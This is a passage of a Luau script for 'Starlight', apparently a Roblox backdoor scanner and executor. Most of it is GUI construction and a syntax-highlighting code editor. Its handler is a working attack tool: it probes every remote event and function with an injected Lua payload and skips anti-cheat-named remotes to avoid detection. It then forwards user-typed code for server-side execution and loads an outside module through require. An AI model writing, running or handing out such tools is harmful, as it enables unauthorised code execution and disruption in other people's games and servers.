STR["74"]["Name"] = [[Icon]];
STR["74"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.EventCheckbox.Title
STR["75"] = Instance.new("TextLabel", STR["70"]);
STR["75"]["BorderSizePixel"] = 0;
STR["75"]["TextSize"] = 18;
STR["75"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["75"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["75"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["75"]["BackgroundTransparency"] = 1;
STR["75"]["Size"] = UDim2.new(0, 0, 1, 0);
STR["75"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["75"]["Text"] = [[  Scan for Events]];
STR["75"]["AutomaticSize"] = Enum.AutomaticSize.X;
STR["75"]["Name"] = [[Title]];
STR["75"]["Position"] = UDim2.new(1, 0, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox
STR["76"] = Instance.new("Frame", STR["68"]);
STR["76"]["BorderSizePixel"] = 0;
STR["76"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["76"]["Size"] = UDim2.new(0, 24, 0, 24);
STR["76"]["Position"] = UDim2.new(0, 325, 0, 80);
STR["76"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["76"]["Name"] = [[FunctionCheckbox]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.UIStroke
STR["77"] = Instance.new("UIStroke", STR["76"]);
STR["77"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["77"]["Thickness"] = 0.7;
STR["77"]["Color"] = Color3.fromRGB(90, 90, 90);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.UICorner
STR["78"] = Instance.new("UICorner", STR["76"]);
STR["78"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.Button
STR["79"] = Instance.new("TextButton", STR["76"]);
STR["79"]["BorderSizePixel"] = 0;
STR["79"]["TextSize"] = 14;
STR["79"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["79"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["79"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["79"]["BackgroundTransparency"] = 1;
STR["79"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["79"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["79"]["Text"] = [[]];
STR["79"]["Name"] = [[Button]];


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.Icon
STR["7a"] = Instance.new("ImageLabel", STR["76"]);
STR["7a"]["BorderSizePixel"] = 0;
STR["7a"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
-- [ERROR] cannot convert ImageContent, please report to "https://github.com/uniquadev/GuiToLuaConverter/issues"
STR["7a"]["AnchorPoint"] = Vector2.new(0.5, 0.5);
STR["7a"]["Image"] = [[rbxassetid://12690727184]];
STR["7a"]["Size"] = UDim2.new(0, 12, 0, 12);
STR["7a"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["7a"]["BackgroundTransparency"] = 1;
STR["7a"]["Name"] = [[Icon]];
STR["7a"]["Position"] = UDim2.new(0.5, 0, 0.5, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.FunctionCheckbox.Title
STR["7b"] = Instance.new("TextLabel", STR["76"]);
STR["7b"]["BorderSizePixel"] = 0;
STR["7b"]["TextSize"] = 18;
STR["7b"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["7b"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["7b"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["7b"]["BackgroundTransparency"] = 1;
STR["7b"]["Size"] = UDim2.new(0, 0, 1, 0);
STR["7b"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["7b"]["Text"] = [[  Scan for Functions]];
STR["7b"]["AutomaticSize"] = Enum.AutomaticSize.X;
STR["7b"]["Name"] = [[Title]];
STR["7b"]["Position"] = UDim2.new(1, 0, 0, 0);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.Title2
STR["7c"] = Instance.new("TextLabel", STR["68"]);
STR["7c"]["BorderSizePixel"] = 0;
STR["7c"]["TextSize"] = 32;
STR["7c"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["7c"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.SemiBold, Enum.FontStyle.Normal);
STR["7c"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["7c"]["BackgroundTransparency"] = 1;
STR["7c"]["Size"] = UDim2.new(0, 0, 0, 32);
STR["7c"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["7c"]["Text"] = [[Background]];
STR["7c"]["AutomaticSize"] = Enum.AutomaticSize.X;
STR["7c"]["Name"] = [[Title2]];
STR["7c"]["Position"] = UDim2.new(0, 342, 0, 125);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.BackgroundChanger
STR["7d"] = Instance.new("TextButton", STR["68"]);
STR["7d"]["BorderSizePixel"] = 0;
STR["7d"]["TextSize"] = 14;
STR["7d"]["AutoButtonColor"] = false;
STR["7d"]["TextColor3"] = Color3.fromRGB(0, 0, 0);
STR["7d"]["BackgroundColor3"] = Color3.fromRGB(17, 17, 17);
STR["7d"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["7d"]["Size"] = UDim2.new(0, 128, 0, 64);
STR["7d"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["7d"]["Text"] = [[]];
STR["7d"]["Name"] = [[BackgroundChanger]];
STR["7d"]["Position"] = UDim2.new(1, -153, 1, -78);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.BackgroundChanger.UICorner
STR["7e"] = Instance.new("UICorner", STR["7d"]);
STR["7e"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.BackgroundChanger.UIStroke
STR["7f"] = Instance.new("UIStroke", STR["7d"]);
STR["7f"]["ApplyStrokeMode"] = Enum.ApplyStrokeMode.Border;
STR["7f"]["Thickness"] = 1.5;
STR["7f"]["Color"] = Color3.fromRGB(58, 58, 58);


-- StarterGui.Starlight.MainFrame.Insides.Tabs.Settings.BackgroundChanger.Title
STR["80"] = Instance.new("TextLabel", STR["7d"]);
STR["80"]["TextWrapped"] = true;
STR["80"]["BorderSizePixel"] = 0;
STR["80"]["TextSize"] = 24;
STR["80"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["80"]["FontFace"] = Font.new([[rbxasset://fonts/families/SourceSansPro.json]], Enum.FontWeight.Regular, Enum.FontStyle.Normal);
STR["80"]["TextColor3"] = Color3.fromRGB(255, 255, 255);
STR["80"]["BackgroundTransparency"] = 1;
STR["80"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["80"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["80"]["Text"] = [[Current: Normal]];
STR["80"]["Name"] = [[Title]];


-- StarterGui.Starlight.MainFrame.Background
STR["81"] = Instance.new("ImageLabel", STR["2"]);
STR["81"]["ZIndex"] = -1;
STR["81"]["BorderSizePixel"] = 0;
STR["81"]["BackgroundColor3"] = Color3.fromRGB(255, 255, 255);
STR["81"]["Size"] = UDim2.new(1, 0, 1, 0);
STR["81"]["BorderColor3"] = Color3.fromRGB(0, 0, 0);
STR["81"]["BackgroundTransparency"] = 1;
STR["81"]["Name"] = [[Background]];


-- StarterGui.Starlight.MainFrame.Background.UICorner
STR["82"] = Instance.new("UICorner", STR["81"]);
STR["82"]["CornerRadius"] = UDim.new(0, 6);


-- StarterGui.Starlight.MainFrame.Handler
local function C_e()
local script = STR["e"];
	--UI Objects
	local sgui = script.Parent.Parent
	local mainframe = sgui.MainFrame
	local insides = mainframe.Insides
	local tabsframe = insides.Tabs
	local tabs = {
		executor = tabsframe.Executor,
		scripts = tabsframe.Scripts,
		settings = tabsframe.Settings,
	}
	local buttons = {
		exit = mainframe.Exit,
		minimze = mainframe.Minimize,
		execute = tabs.executor.Execute,
		clear = tabs.executor.Clear,
		attach = tabs.executor.Attach,
		r6 = tabs.executor.R6,
		eventcheckbox = tabs.settings.EventCheckbox.Button,
		functioncheckbox = tabs.settings.FunctionCheckbox.Button,
		changebackground = tabs.settings.BackgroundChanger
	}
	
	local scanningtext = tabs.executor.ScaningText
	local status = insides.TabSelector.Status
	local console = tabs.settings.Console
	local examplelog = console.Example
	local background = mainframe.Background
	
	--Variables
	local services = {
		uis = game:GetService("UserInputService"),
		startergui = game:GetService("StarterGui"),
		logservice = game:GetService("LogService"),
	}
	local info = {
		vulninstance = nil,
		backdoored = false,
		timeout = 0.4,
		currentbackground = 1,
	}
	local scanfor = {
		events = true,
		functions = true,
	}
	local player = game:GetService("Players").LocalPlayer
	local blacklistedstrings = {"CheatDetected", "ExploitDetected","MouseLock","MouseLoc"}
	local minimized = false
	local dragging, dragstart, startpos
	
	--Functions
	local function playsound(id)
		local sound = Instance.new("Sound",game:GetService("SoundService"))
		sound.SoundId = "rbxassetid://"..tostring(id)
		sound.Volume = 0.5
		sound.PlayOnRemove = true
		sound:Destroy()
	end
	
	local function notify(message, duration)
		pcall(function()
			playsound(8055713313)
			services.startergui:SetCore("SendNotification", {
				Title = "💫 Starlight 0.3.0",
				Text = tostring(message),
				Duration = duration or 3,
			})
		end)
	end
	
	local function fire(instance: RemoteEvent | RemoteFunction, code)
		if instance == nil then return end
	
		pcall(function()
			if instance:IsA("RemoteEvent") then
				instance:FireServer(code)
			elseif instance:IsA("RemoteFunction") then
				coroutine.wrap(function()
					return instance:InvokeServer(code)
				end)()
			end
		end)
	end
	
	local function checkremote(instance: RemoteEvent | RemoteFunction)
		for _, str in ipairs(blacklistedstrings) do
			if string.find(instance.Name:lower(), str:lower()) then
				return true
			end
		end
		if instance:FindFirstChild("__FUNCTION") or instance.Name == "__FUNCTION" or instance.Name == "CharacterSoundEvent" then
			return true
		end
		if instance.Parent.Parent then
			if instance.Parent.Parent.Name == "HDAdminClient" and instance.Parent.Name == "Signals" then
				return true
			end
			if instance.Parent.Name == "RobloxReplicatedStorage" 
				or instance.Parent.Name == "DefaultChatSystemChatEvents" then
				return true
			end
		end
		return false
	end
	
	--MainFrame Dragging
	pcall(function()
		mainframe.InputBegan:Connect(function(input)
			if input.UserInputType.Name == "MouseButton1" or input.UserInputType.Name == "Touch" then
				dragging, dragstart, startpos = true, input.Position, mainframe.Position
				input.Changed:Connect(function()
					if input.UserInputState == Enum.UserInputState.End then dragging = false end
				end)
			end
		end)
		services.uis.InputChanged:Connect(function(input)
			if dragging and (input.UserInputType.Name == "MouseMovement" or input.UserInputType.Name == "Touch") then
				local delta = input.Position - dragstart
				mainframe.Position = UDim2.new(startpos.X.Scale, startpos.X.Offset + delta.X, startpos.Y.Scale, startpos.Y.Offset + delta.Y)
			end
		end)
	end)
	
	--Logging
	local syntaxcolors ={
		output = Color3.fromRGB(255, 255, 255),
		info = Color3.fromRGB(110, 192, 255),
		warn = Color3.fromRGB(255, 136, 57),
		error = Color3.fromRGB(255, 75, 75),
		regular = Color3.fromRGB(200, 200, 200),
	}
	
	local function gettime()
		local time = os.date("*t")
		return string.format("[%02d:%02d:%02d]",time.hour,time.min,time.sec)
	end
	
	local function createlog(msg: string,type)
		local new = examplelog:Clone()
		new.Text = gettime().." "..msg
		new.Parent = console
		new.Visible = true
	
		if type == Enum.MessageType.MessageOutput then
			new.TextColor3 = syntaxcolors.output
		elseif type == Enum.MessageType.MessageInfo then
			new.TextColor3 = syntaxcolors.info
		elseif type == Enum.MessageType.MessageWarning then
			new.TextColor3 = syntaxcolors.warn
		elseif type == Enum.MessageType.MessageError then
			new.TextColor3 = syntaxcolors.error
		else
			new.TextColor3 = syntaxcolors.regular
		end
	end
	
	services.logservice.MessageOut:Connect(function(msg: string,type)
		createlog(msg,type)
	end)
	
	--Settings
	buttons.eventcheckbox.MouseButton1Click:Connect(function()
		scanfor.events = not scanfor.events
		buttons.eventcheckbox.Parent.Icon.Visible = scanfor.events
		print(scanfor.events)
	end)
	buttons.functioncheckbox.MouseButton1Click:Connect(function()
		scanfor.functions = not scanfor.functions
		buttons.functioncheckbox.Parent.Icon.Visible = scanfor.functions
		print(scanfor.functions)
	end)
	
	
	--Tab Switching
	for _, tab: Frame in pairs(tabsframe:GetChildren()) do
		if tab:IsA("Frame") then
			if tab.Name ~= "Executor" then
				tab.Visible = false
			else
				tab.Visible = true
			end
		end
	end
	
	pcall(function()
		for _, button: TextButton in pairs(insides.TabSelector:GetChildren()) do
			if button:IsA("TextButton")	then
				button.MouseButton1Click:Connect(function()
					for _, tab: Frame in pairs(tabsframe:GetChildren()) do
						if tab:IsA("Frame") then
							if tab.Name ~= button.Name then
								tab.Visible = false
							else
								tab.Visible = true
							end
						end
					end
				end)
			end
		end
	end)
	
	--Scanning
	local testpartname: string = "luaclipse_"..tostring(math.random(10000,99999))
	local payload = [[Instance.new("FluidForceSensor", game:GetService("SoundService")).Name = "]]..testpartname..[["]]
	
	local instances = {}
	local timer: number = 0
	
	local function checkpayload(instance: RemoteEvent | RemoteFunction)
		fire(instance,payload)
		local start = os.clock()
		while os.clock() - start < info.timeout do
			if game:GetService("SoundService"):FindFirstChild(testpartname) then
				return true
			end
			task.wait(0.001)
		end
		return false
	end
	
	local function scan()
		status.BackgroundColor3 = Color3.fromRGB(255, 127, 41)
		buttons.attach.Visible = false
		scanningtext.Visible = true
		
		coroutine.wrap(function()
			repeat
				timer += 0.001
				task.wait(0.001)
			until info.backdoored
		end)()
		
		table.clear(instances)
		
		for _, instance in ipairs(game:GetDescendants()) do
			if instance.Parent == nil then return end
			if instance:IsA("RemoteEvent") and scanfor.events then
				scanningtext.Text = "Checking: "..instance.Name
				if checkremote(instance) then
					continue
				else
					table.insert(instances,instance)
				end
			end
			if instance:IsA("RemoteFunction") and scanfor.functions then
				scanningtext.Text = "Checking: "..instance.Name
				if checkremote(instance) then
					continue
				else
					table.insert(instances,instance)
				end
			end
		end
	
		for _, instance: RemoteEvent | RemoteFunction in ipairs(instances) do
			scanningtext.Text = "Testing: "..instance.Name
			if checkpayload(instance) then
				info.backdoored = true
				info.vulninstance = instance
				fire(instance,[[game:GetService("SoundService"):FindFirstChild("]]..testpartname..[["):Destroy()]])
				break
			end
		end
		
		if info.backdoored and info.vulninstance then
			status.BackgroundColor3 = Color3.fromRGB(106, 255, 89)
			scanningtext.Text = "Found backdoor: "..info.vulninstance.Name
			notify("Time took: \n"..tostring(timer).." seconds",5)
		else
			status.BackgroundColor3 = Color3.fromRGB(255, 75, 75)
			scanningtext.Text = "No backdoor found :("
			wait(3)
			buttons.attach.Visible = true
			scanningtext.Visible = false
		end
	end
	
	--Buttons
	for _, button: TextButton in ipairs(mainframe:GetDescendants()) do
		if button:IsA("TextButton") then
			button.AutoButtonColor = false
			button.MouseEnter:Connect(function()
				button.BackgroundColor3 = Color3.fromRGB(24, 24, 24)
			end)
			button.MouseLeave:Connect(function()
				button.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
			end)
		end
	end
	
	buttons.exit.MouseButton1Click:Connect(function()
		pcall(function()
			mainframe:TweenSize(UDim2.new(0,0,0,0),"InOut","Sine",0.5,false)
			wait(0.51)
			sgui:Destroy()
		end)
		return
	end)
	pcall(function()
		buttons.minimze.MouseButton1Click:Connect(function()
			if not minimized then
				mainframe:TweenSize(UDim2.new(0,330,0,85),"InOut","Sine",0.5,false)
			else
				mainframe:TweenSize(UDim2.new(0,600,0,350),"InOut","Sine",0.5,false)
			end
			wait(0.51)
			minimized = not minimized
		end)
	end)
	buttons.attach.MouseButton1Click:Connect(function()
		scan()
	end)
	buttons.execute.MouseButton1Click:Connect(function()
		if not info.backdoored and not info.vulninstance then
			notify("Execution won't work without attaching")
			return
		end
		local code = tabs.executor.FastColoredTextboxV3.Scroll.TextBox.Text
		fire(info.vulninstance,code)
	end)
	buttons.clear.MouseButton1Click:Connect(function()
		tabs.executor.FastColoredTextboxV3.Scroll.TextBox.Text = ""
	end)
	buttons.r6.MouseButton1Click:Connect(function()
		fire(info.vulninstance,[[
	game:GetService("Players"):FindFirstChild("]]..player.Name..[["):LoadCharacter()
	task.wait(0.02)
	require(3436957371):r6(game:GetService("Players"):FindFirstChild("]]..player.Name..[[").Name)
			]])
	end)
	buttons.changebackground.MouseButton1Click:Connect(function()
		if info.currentbackground == 5 then
			info.currentbackground = 1
		else
			info.currentbackground += 1
		end
		if info.currentbackground == 1 then
			buttons.changebackground.Title.Text = "Current:\nNormal"
			background.Image = "rbxassetid://0"
		elseif info.currentbackground == 2 then
			buttons.changebackground.Title.Text = "Current:\nModern"
			background.Image = "rbxassetid://992001116"
		elseif info.currentbackground == 3 then
			buttons.changebackground.Title.Text = "Current:\nGalaxy"
			background.Image = "rbxassetid://9305457875"
		elseif info.currentbackground == 4 then
			buttons.changebackground.Title.Text = "Current:\nRocks"
			background.Image = "rbxassetid://12569743473"
		elseif info.currentbackground == 5 then
			buttons.changebackground.Title.Text = "Current:\nWater"
			background.Image = "rbxassetid://17423929525"
		end
	end)
	
	--Scripts
end;
task.spawn(C_e);
-- StarterGui.Starlight.MainFrame.Insides.Tabs.Executor.FastColoredTextboxV3.Handler
local function C_32()
local script = STR["32"];
	--# FastColoredTextBox v3 by: C:\Drive
	
	local fctbelements = {
		scroll = script.Parent.Scroll,
		textbox = script.Parent.Scroll.TextBox,
		cursor = script.Parent.Scroll.Cursor,
		selector = script.Parent.Scroll.LineSelector,
		lines = script.Parent.Scroll.LinesFrame,
		linetemp = script.Parent.Scroll.LinesFrame.TextLabelTemplate,
		highlighting = script.Parent.Scroll.Highlighting,
		measurer = script.Parent.Scroll.TextMeasurer,
		linesvalue = script.Parent.Scroll.LinesValue,
	}
	
	--# Automatic Scrolling (1/7)
	local scrollingframe = fctbelements.scroll
	local textbox = fctbelements.textbox
	local textservice = game:GetService("TextService")
	
	local function updatecanvassize()
		local textsize = textservice:GetTextSize(textbox.Text, textbox.TextSize, textbox.Font, Vector2.new(math.huge, math.huge))
		scrollingframe.CanvasSize = UDim2.new(0, textsize.X + 20, 0, textsize.Y)
	end
	
	--textbox:GetPropertyChangedSignal("Text"):Connect(updatecanvassize) --- MOVED THIS CODE TO LINE 257 OR SOMEWHERE NEAR THAT
	updatecanvassize()
	
	--# Line Checker (2/7)
	local textbox = fctbelements.textbox
	local linesvalue = fctbelements.linesvalue
	
	local function countlines(text)
		return select(2, text:gsub("\n", "\n")) + 1
	end
	
	local lastlinecount = countlines(textbox.Text)
	
	textbox:GetPropertyChangedSignal("Text"):Connect(function()
		local currentlinecount = countlines(textbox.Text)
		if currentlinecount ~= lastlinecount then
			linesvalue.Value += currentlinecount - lastlinecount
			lastlinecount = currentlinecount
		end
	end)
	
	--# Lines (3/7)
	local scrollingframe = fctbelements.scroll
	local frame = fctbelements.lines
	local template = fctbelements.linetemp
	local linesvalue = fctbelements.linesvalue
	
	local clones = {}
	local currentlinecount = 1
	
	linesvalue:GetPropertyChangedSignal("Value"):Connect(function()
		local newlinecount = linesvalue.Value
		if newlinecount > currentlinecount then
			for _ = 1, newlinecount - currentlinecount do
				local clone = template:Clone()
				clone.Visible = true
				clone.Text = tostring(#clones + 2)
				clone.Parent = frame
				table.insert(clones, clone)
			end
		elseif newlinecount < currentlinecount then
			for _ = 1, currentlinecount - newlinecount do
				local lastclone = table.remove(clones)
				if lastclone then lastclone:Destroy() end
			end
		end
		currentlinecount = newlinecount
	end)
	
	--# Cursor (4/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local cursorframe = fasttextbox:WaitForChild("Cursor")
	local measurer = fasttextbox:WaitForChild("TextMeasurer")
	local blinkinterval = 0.5
	local lineheight = textbox.TextSize
	
	cursorframe.Size = UDim2.new(0, 1, 0, lineheight)
	cursorframe.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
	
	local function updatecursor()
		local cursorpos = textbox.CursorPosition
		if cursorpos <= 0 then
			cursorframe.Visible = false
			return
		end
		local textbeforecursor = textbox.Text:sub(1, cursorpos - 1)
		local linenumber = select(2, textbeforecursor:gsub("\n", "\n")) + 1
		local currentlinetext = textbeforecursor:match(".*()\n") and textbeforecursor:sub(textbeforecursor:match(".*()\n") + 1) or textbeforecursor
	
		measurer.Text = currentlinetext
		cursorframe.Position = UDim2.new(0, measurer.TextBounds.X + 17, 0, (linenumber - 1) * lineheight)
		cursorframe.Visible = true
	end
	
	local function blink()
		while true do
			cursorframe.Visible = not cursorframe.Visible
			wait(blinkinterval)
		end
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatecursor)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatecursor)
	spawn(blink)
	updatecursor()
	
	--# Selector (5/7)
	local fasttextbox = fctbelements.scroll
	local textbox = fasttextbox:WaitForChild("TextBox")
	local selector = fasttextbox:WaitForChild("LineSelector")
	local lineheight = textbox.TextSize
	selector.BackgroundTransparency = 0.85
	
	local tweenservice = game:GetService("TweenService")
	local tweeninfo = TweenInfo.new(0, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
	
	local function updatelineselector()
		local cursor = textbox.CursorPosition
		if cursor <= 0 then
			selector.Visible = false
			return
		end
		local linenumber = select(2, textbox.Text:sub(1, cursor):gsub("\n", "\n")) + 1
		tweenservice:Create(selector, tweeninfo, {
			Position = UDim2.new(0, 17, 0, (linenumber - 1) * lineheight),
			Size = UDim2.new(1, 0, 0, lineheight),
		}):Play()
		selector.Visible = true
	end
	
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(updatelineselector)
	textbox:GetPropertyChangedSignal("Text"):Connect(updatelineselector)
	updatelineselector()
	
	--# Syntax Highlighting (6/7)
	local scrollingframe = fctbelements.scroll
	local textbox = scrollingframe:WaitForChild("TextBox")
	local highlightlabel = scrollingframe:WaitForChild("Highlighting")
	
	local keywords = {
		["and"] = "keyword", ["break"] = "keyword", ["do"] = "keyword",
		["else"] = "keyword", ["elseif"] = "keyword", ["end"] = "keyword",
		["false"] = "keyword", ["for"] = "keyword", ["function"] = "keyword",
		["if"] = "keyword", ["in"] = "keyword", ["local"] = "keyword",
		["nil"] = "keyword", ["not"] = "keyword", ["or"] = "keyword",
		["repeat"] = "keyword", ["return"] = "keyword", ["then"] = "keyword",
		["true"] = "keyword", ["until"] = "keyword", ["while"] = "keyword",
		["require"] = "function", ["goto"] = "keyword", ["self"] = "keyword",
		["print"] = "function", ["pairs"] = "function", ["ipairs"] = "function",
		["next"] = "function", ["tonumber"] = "function", ["tostring"] = "function",
		["type"] = "function", ["pcall"] = "function", ["xpcall"] = "function",
		["coroutine"] = "global", ["table"] = "global", ["string"] = "global",
		["math"] = "global", ["os"] = "global",
		["assert"] = "function", ["error"] = "function", ["rawget"] = "function",
		["rawset"] = "function",
		["game"] = "global", ["workspace"] = "global", ["script"] = "global",
		["Instance"] = "type", ["Vector3"] = "type", ["CFrame"] = "type",
		["Color3"] = "type", ["UDim2"] = "type", ["Enum"] = "type",
		["wait"] = "function", ["delay"] = "function", ["spawn"] = "function",
		["tick"] = "function", ["time"] = "function",
		["Vector2"] = "type", ["BrickColor"] = "type", ["Region3"] = "type",
		["Ray"] = "type", ["task"] = "global", ["RunService"] = "global",
		["UserInputService"] = "global",
	}
	
	local colormap = {
		keyword   = Color3.fromRGB(248, 109, 124),
		["function"] = Color3.fromRGB(132, 214, 247),
		["global"]   = Color3.fromRGB(132, 214, 247),
		["type"]     = Color3.fromRGB(132, 214, 247),
		string    = Color3.fromRGB(173, 241, 149),
		comment   = Color3.fromRGB(145, 145, 145),
		number    = Color3.fromRGB(255, 198, 0),
		operator  = Color3.fromRGB(200, 200, 200),
	}
	
	local function rgb(c)
		return math.floor(c.R * 255), math.floor(c.G * 255), math.floor(c.B * 255)
	end
	
	local function colored(text, kind)
		local c = colormap[kind]
		if not c then return text end
		local r,g,b = rgb(c)
		return `<font color="rgb({r},{g},{b})">{text}</font>`
	end
	
	local function highlight(code)
		local result = ""
		local i = 1
		while i <= #code do
			if code:sub(i, i+1) == "--" then
				local comment = code:sub(i):match("^%-%-[^\n]*")
				result ..= colored(comment, "comment")
				i += #comment
			elseif code:sub(i, i) == '"' or code:sub(i, i) == "'" then
				local quote = code:sub(i, i)
				local s, e = code:find(quote..".-"..quote, i)
				local str = s and code:sub(s, e) or quote
				result ..= colored(str, "string")
				i = s and e + 1 or i + 1
			elseif code:sub(i):match("^%d") then
				local num = code:sub(i):match("^%d+%.?%d*")
				result ..= colored(num, "number")
				i += #num
			elseif code:sub(i):match("^%a") then
				local word = code:sub(i):match("^[%a_][%w_]*")
				local kind = keywords[word]
				if kind then
					result ..= colored(word, kind)
				else
					result ..= word
				end
				i += #word
			elseif code:sub(i):match("^[%p]") then
				result ..= colored(code:sub(i,i), "operator")
				i += 1
			else
				result ..= code:sub(i, i)
				i += 1
			end
		end
		return result
	end
	
	local function sync()
		highlightlabel.Text = highlight(textbox.Text)
		highlightlabel.Size = textbox.Size
		highlightlabel.Position = textbox.Position
	end
	
	textbox:GetPropertyChangedSignal("Text"):Connect(sync)
	textbox:GetPropertyChangedSignal("CursorPosition"):Connect(sync)
	textbox:GetPropertyChangedSignal("Size"):Connect(sync)
	textbox.Text = "--# Welcome to Starlight!\n--#.gg/FUARur4Q"
	sync()
	
	--# Scrollbar Buttons (7/7)
	local ground = script.Parent.Ground
	
	local buttons = {
		y = {
			top = script.Parent.Y_Top,
			btm = script.Parent.Y_Btm,
		},
		x = {
			lft = script.Parent.X_Lft,
			rght = script.Parent.X_Rght,
		}
	}
	
	local bars = {
		y = script.Parent.Y_Bar,
		x = script.Parent.X_Bar,
	}
	
	buttons.y.top.Visible = false
	buttons.y.btm.Visible = false
	buttons.x.rght.Visible = false
	buttons.x.lft.Visible = false
	ground.Visible = false
	
	fctbelements.textbox:GetPropertyChangedSignal("Text"):Connect(function()
		updatecanvassize()
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) then
			buttons.y.top.Visible = true
			buttons.y.btm.Visible = true
			--bars.y.Visible = true
		else
			buttons.y.top.Visible = false
			buttons.y.btm.Visible = false
			--bars.y.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.x.lft.Visible = true
			buttons.x.rght.Visible = true
			--bars.x.Visible = true
		else
			buttons.x.lft.Visible = false
			buttons.x.rght.Visible = false
			--bars.x.Visible = false
		end
		
		if fctbelements.scroll.CanvasSize.Y.Offset > (fctbelements.scroll.AbsoluteSize.Y - 16) and fctbelements.scroll.CanvasSize.X.Offset > fctbelements.scroll.AbsoluteSize.X then
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -34)
			buttons.x.rght.Position = UDim2.new(1, -34, 1, -17)
			ground.Visible = true
		else
			buttons.y.btm.Position = UDim2.new(1, -17, 1, -17)
			buttons.x.rght.Position = UDim2.new(1, -18, 1, -17)
			ground.Visible = false
		end
	end)
end;
task.spawn(C_32);

return STR["1"], require;
